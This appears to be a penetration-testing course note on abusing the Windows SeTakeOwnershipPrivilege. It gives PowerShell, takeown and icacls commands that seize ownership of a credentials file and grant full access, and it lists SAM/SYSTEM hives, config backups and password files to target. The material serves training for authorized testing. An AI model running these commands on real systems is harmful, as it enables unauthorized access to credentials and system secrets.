
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object". This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object.

We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```Caution 
Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.
```

---
## Exploitation

```Powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
### checking file details

PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
### checking file ownership

PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
### taking ownership with takedown Windows binary, might not grant all privileges

PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
### modifying file's ACL giving full privileges
```

---
## Files of Interest

```shell
c:\inetpub\wwwwroot\web.config 
%WINDIR%\repair\sam 
%WINDIR%\repair\system 
%WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\system32\config\SecEvent.Evt 
%WINDIR%\system32\config\default.sav 
%WINDIR%\system32\config\security.sav 
%WINDIR%\system32\config\software.sav 
%WINDIR%\system32\config\system.sav
```

More like  `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other config files, virtual hard drive files.

---